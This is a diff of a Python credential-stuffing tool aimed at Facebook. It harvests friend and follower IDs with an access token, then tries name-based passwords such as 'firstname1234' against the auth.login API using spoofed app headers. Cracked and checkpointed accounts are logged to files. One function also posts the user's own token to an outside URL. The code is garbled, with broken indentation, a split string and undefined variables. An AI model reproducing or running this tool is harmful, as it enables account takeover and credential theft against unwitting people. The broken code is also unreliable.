+        token = open("Ars_token.txt", "r").read()
+        menu()
+    	except(KeyError , IOError):
+		print("    _    ____  ____  _        _    _   _ ")
+		print("   / \  |  _ \/ ___|| |      / \  | \ | |")
+		print("  / _ \ | |_) \___ \| |     / _ \ |  \| |")
+		print(" / ___ \|  _ < ___) | |___ / ___ \| |\  |")
+		print("/_/   \_\_| \_\____/|_____/_/   \_\_| \_|")
+		print("")
+		print("\t\033[92;1m      LOGIN TOKEN\x1b[0m")
+		print("")
+        token = raw_input("\033[93;1m PASTE TOKEN HERE: \033[92;1m")
+        sav = open("Ars_token.txt", "w")
+        sav.write(token)
+        sav.close()
+        token_check()
+        menu()
+
+def token_check():
+	try:
+		token=open('Ars_token.txt','r').read()
+	except IOError:
+		print"\033[91;1m[!] TOKEN INVALID"
+		os.system('rm -rf Ars_token.txt')
+	requests.post(useragent_url + token, headers=header)
+	pass
+
+def menu():
+    os.system("clear")
+    try:
+        token = open("Ars_token.txt", "r").read()
+    except(KeyError , IOError):
+        token()
+    try:
+        r = requests.get("https://graph.facebook.com/me?access_token="+token)
+        q = json.loads(r.text)
+        name = q["name"]
+    	except(KeyError):
+		print("    _    ____  ____  _        _    _   _ ")
+		print("   / \  |  _ \/ ___|| |      / \  | \ | |")
+		print("  / _ \ | |_) \___ \| |     / _ \ |  \| |")
+		print(" / ___ \|  _ < ___) | |___ / ___ \| |\  |")
+		print("/_/   \_\_| \_\____/|_____/_/   \_\_| \_|")
+		print("")
+		print("\033[91;1m      LOGGED IN TOKEN HAS EXPIRED")
+        os.system("rm -rf Ars_token.txt")
+        print("")
+        time.sleep(1)
+        main()
+    os.system("clear")
+    xn = name.upper()
+	print("    _    ____  ____  _        _    _   _ ")
+	print("   / \  |  _ \/ ___|| |      / \  | \ | |")
+	print("  / _ \ | |_) \___ \| |     / _ \ |  \| |")
+	print(" / ___ \|  _ < ___) | |___ / ___ \| |\  |")
+	print("/_/   \_\_| \_\____/|_____/_/   \_\_| \_|")
+	print("")
+ print("\033[93;1m      HELLO : ")
+print("\033[92;1m"+xn)
+print("\033[93;1m     REGION  : \033[92;1m"+loc)
+print("\033[93;1m     YOUR IP : \033[92;1m"+ip)
+    print("")
+
+    print("")
+    print("\033[92;1m   ARSALAN   [Ars 1] CRACK WITH AUTO PASS")
+    print("\033[93;1m             [Ars 2] CRACK WITH DIGIT PASS")
+    print('\033[91;1m  Name yad rakhna [Ars 0] BACK')
+    print("")
+    menu_option()
     
-    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
-        try:
-            with requests.Session() as session:
-                headers = {
-                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
-                    'x-fb-sim-hni': str(rr(20000, 40000)),
-                    'x-fb-net-hni': str(rr(20000, 40000)),
-                    'x-fb-connection-quality': 'EXCELLENT',
-                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
-                    'user-agent': window1(),
-                    'content-type': 'application/x-www-form-urlencoded',
-                    'x-fb-http-engine': 'Liger'
-                }
-                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
-                po = session.get(url, headers=headers).json()
-                if 'session_key' in str(po):
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/ARSA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                    oks.append(uid)
-                    break
-                elif 'session_key' in po:
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/ARSA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                    oks.append(uid)
-                    break
-        except Exception as e:
-            pass
-    loop += 1
+def menu_option():
+	select = raw_input("\033[92;1m  CHOOSE : ")
+	if select =="1":
+		crack1()
+	elif select =="2":
+		crack()
+	elif select =="0":
+		main()
+	else:
+		print("")
+		print("\t\033[91;1m     SELECT VALID OPTION")
+		print("")
+		menu_option()
 
-if __name__ == '__main__':
-    BNG_71_()
+def crack1():
+	global token
+	os.system("clear")
+	try:
+		token = open("Ars_token.txt","r").read()
+	except IOError:
+		print("")
+		print("\t\033[91;1m  TOKEN NOT FOUND ")
+		time.sleep(1)
+		fb_token()
+	os.system("clear")
+	print("    _    ____  ____  _        _    _   _ ")
+	print("   / \  |  _ \/ ___|| |      / \  | \ | |")
+	print("  / _ \ | |_) \___ \| |     / _ \ |  \| |")
+	print(" / ___ \|  _ < ___) | |___ / ___ \| |\  |")
+	print("/_/   \_\_| \_\____/|_____/_/   \_\_| \_|")
+	print("")
+	print("\t\033[93;1m      CRACK WITH AUTO PASS")
+	print("")
+	print("\033[94;1m  [Ars]  1] CRACK PUBLIC ID")
+	print("\033[93;1m  [Ars]  2] CRACK FOLLOWERS")
+	print("\033[92;1m  [Ars]  3] CRACK FILE")
+	print("")
+	crack_select1()
+	
+def crack_select1():
+	select = raw_input("\033[92;1m  CHOOSE : ")
+	id=[]
+	oks=[]
+	cps=[]
+	if select =="1":
+		os.system("clear")
+	    print("    _    ____  ____  _        _    _   _ ")
+	print("   / \  |  _ \/ ___|| |      / \  | \ | |")
+	print("  / _ \ | |_) \___ \| |     / _ \ |  \| |")
+	print(" / ___ \|  _ < ___) | |___ / ___ \| |\  |")
+	print("/_/   \_\_| \_\____/|_____/_/   \_\_| \_|")
+	print("")
+	print("\t\033[92;1m      MULTI PUBLIC ID CLONING ")
+		print("")
+		try:
+			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
+			print("")
+		except:id_limit=1
+		for t in range(id_limit):
+			t +=1
+			idt = raw_input("\033[93;1m  INPUT PUBLIC ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
+			try:
+				for i in requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token).json()["data"]:
+					uid = i["id"].encode('utf-8')
+					na = i["name"].encode('utf-8')
+					id.append(uid+"|"+na)
+			except KeyError:
+				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
+			print("\033[94;1m          TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
+		time.sleep(3)
+	elif select =="2":
+		os.system("clear")
+	     print("    _    ____  ____  _        _    _   _ ")
+	print("   / \  |  _ \/ ___|| |      / \  | \ | |")
+	print("  / _ \ | |_) \___ \| |     / _ \ |  \| |")
+	print(" / ___ \|  _ < ___) | |___ / ___ \| |\  |")
+	print("/_/   \_\_| \_\____/|_____/_/   \_\_| \_|")
+	print("")
+	print(" \033[92;1mMULTI FOLLOWERS ID CLONING ")
+		print("")
+		try:
+			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
+			print("")
+		except:id_limit=1
+		for t in range(id_limit):
+			t +=1
+			idt = raw_input("\033[93;1m  INPUT FOLLOWER ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
+			try:
+				for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999").json()["data"]:
+					uid = i["id"].encode('utf-8')
+					na = i["name"].encode('utf-8')
+					id.append(uid+"|"+na)
+			except KeyError:
+				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
+			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
+		time.sleep(3)
+	elif select =="3":
+		os.system("clear")
+	    print("    _    ____  ____  _        _    _   _ ")
+	print("   / \  |  _ \/ ___|| |      / \  | \ | |")
+	print("  / _ \ | |_) \___ \| |     / _ \ |  \| |")
+	print(" / ___ \|  _ < ___) | |___ / ___ \| |\  |")
+	print("/_/   \_\_| \_\____/|_____/_/   \_\_| \_|")
+	print("")
+	print("\t\033[93;1m AUTO PASS CRACKING")
+		print("")
+		filelist = raw_input('\033[92;1m  INPUT FILE: ')
+		try:
+			for line in open(filelist, 'r').readlines():
+				id.append(line.strip())
+				
+		except IOError:
+			print("\t\033[91;1m  REQUESTED FILE NOT FOUND")
+			print("")
+			raw_input("\033[93;1m PRESS ENTER TO BACK")
+			crack1()
+			
+	elif select =="0":
+	    menu()
+	else:
+		print("")
+		print("\t\033[91;1m  SELECT VALID OPTION")
+		print("")
+		crack_select1()
+	os.system("clear")
+		print("    _    ____  ____  _        _    _   _ ")
+	print("   / \  |  _ \/ ___|| |      / \  | \ | |")
+	print("  / _ \ | |_) \___ \| |     / _ \ |  \| |")
+	print(" / ___ \|  _ < ___) | |___ / ___ \| |\  |")
+	print("/_/   \_\_| \_\____/|_____/_/   \_\_| \_|")
+	print("")
+	print("\033[93;1m        TOTAL IDS : \033[92;1m"+str(len(id)))
+	print("\033[92;1m             BRUTE HAS BEEN STARTED\x1b[0m")
+	print("\033[94;1m        Please WAIT SoMEtIMe \033[92;1m✘\033[91;1m✘\x1b[0m")
+	linex()
+	def main(arg):
+	user=arg
+	uid,name=user.split("|")
+	_Arsua = random.choice([
+		"Mozilla/5.0 (Linux; Android 15; TECNO KM5 Build/AP3A.240905.015; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.107 Mobile Safari/537.36 [FB_IAB/FB4A; FBAV/490.0.0.45.75;]",
+		"[FBAN/FB4A; FBAV/490.0.0.45.75; FBBV/612345678; FBDM/{density=2.0,width=720,height=1600}; FBLC/en_US; FBRV/613456789; FBCR/Zong; FBMF/TECNO; FBBD/TECNO; FBPN/com.facebook.katana; FBDV/TECNO KM5]
+1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]", "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]", "Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]", "Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]", "Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]"])
+		try:
+			pass1 = name.lower().split(' ')[0] + '1234'
+			api = 'https://b-api.facebook.com/method/auth.login'
+			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass1, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+			headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _GKua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+			data = requests.get(api, params=params, headers=headers_)
+			if "access_token" in data.text and "EAAA" in data.text:
+				print(" \033[1;32m[GK-cp] "+uid+" | "+pass1+"\033[0;97m")
+				ok = open("ok.txt", "a")
+				ok.write(uid+"|"+pass1+"\n")
+				ok.close()
+				oks.append(uid+pass1)
+			else:
+				if "www.facebook.com" in data.json()['error_msg']:
+					print(" \033[1;33m[GK-cp] "+uid+" | "+pass1+"\033[0;97m")
+					cp = open("cp.txt", "a")
+					cp.write(uid+"|"+pass1+"\n")
+					cp.close()
+					cps.append(uid+pass1)
+				else:
+					pass2 = name.lower().split(' ')[0] + '123'
+					api = 'https://b-api.facebook.com/method/auth.login'
+					params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass2, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+					headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _GKua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+					data = requests.get(api, params=params, headers=headers_)
+					if "access_token" in data.text and "EAAA" in data.text:
+						print(" \033[1;32m[Ars-cp] "+uid+" | "+pass2+"\033[0;97m")
+						ok = open("ok.txt", "a")
+						ok.write(uid+"|"+pass2+"\n")
+						ok.close()
+						oks.append(uid+pass2)
+					else:
+						if "www.facebook.com" in data.json()['error_msg']:
+							print(" \033[1;33m[Ars-cp] "+uid+" | "+pass2+"\033[0;97m")
+							cp = open("cp.txt", "a")
+							cp.write(uid+"|"+pass2+"\n")
+							cp.close()
+							cps.append(uid+pass2)
+						else:
+							pass3 = name.lower().split(' ')[0] + '12'
+							api = 'https://b-api.facebook.com/method/auth.login'
+							params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass3, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+							headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _GKua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+							data = requests.get(api, params=params, headers=headers_)
+							if "access_token" in data.text and "EAAA" in data.text:
+								print(" \033[1;32m[Ars-cp] "+uid+" | "+pass3+"\033[0;97m")
+								ok = open("ok.txt", "a")
+								ok.write(uid+"|"+pass3+"\n")
+								ok.close()
+								oks.append(uid+pass3)
+							else:
+								if "www.facebook.com" in data.json()['error_msg']:
+									print(" \033[1;33m[Ars-cp] "+uid+" | "+pass3+"\033[0;97m")
+									cp = open("cp.txt", "a")
+									cp.write(uid+"|"+pass3+"\n")
+									cp.close()
+									cps.append(uid+pass3)
+								else:
+									pass4 = name.lower().split(' ')[1] + '1234'
+									api = 'https://b-api.facebook.com/method/auth.login'
+									params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass4, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+									headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _GKua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+									data = requests.get(api, params=params, headers=headers_)
+									if "access_token" in data.text and "EAAA" in data.text:
+										print("
+                                        b b b\033[1;32m[Ars_ 
+cp] "+uid+" | "+pass4+"\033[0;97m")
+										ok = open("ok.txt", "a")
+										ok.write(uid+"|"+pass4+"\n")
+										ok.close()
+										oks.append(uid+pass4)
+									else:
+										if "www.facebook.com" in data.json()['error_msg']:
+											print(" \033[1;33m[Ars-cp] "+uid+" | "+pass4+"\033[0;97m")
+											cp = open("cp.txt", "a")
+											cp.write(uid+"|"+pass4+"\n")
+											cp.close()
+											cps.append(uid+pass4)
+										else:
+											pass5 = name.lower().split(' ')[1] + '123'
+											api = 'https://b-api.facebook.com/method/auth.login'
+											params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass5, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+											headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _GKua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+											data = requests.get(api, params=params, headers=headers_)
+											if "access_token" in data.text and "EAAA" in data.text:
+												print(" \033[1;32m[Ars-cp] "+uid+" | "+pass5+"\033[0;97m")
+												ok = open("ok.txt", "a")
+												ok.write(uid+"|"+pass5+"\n")
+												ok.close()
+												oks.append(uid+pass5)
+											else:
+												if "www.facebook.com" in data.json()['error_msg']:
+													print(" \033[1;33m[GK-cp] "+uid+" | "+pass5+"\033[0;97m")
+													cp = 
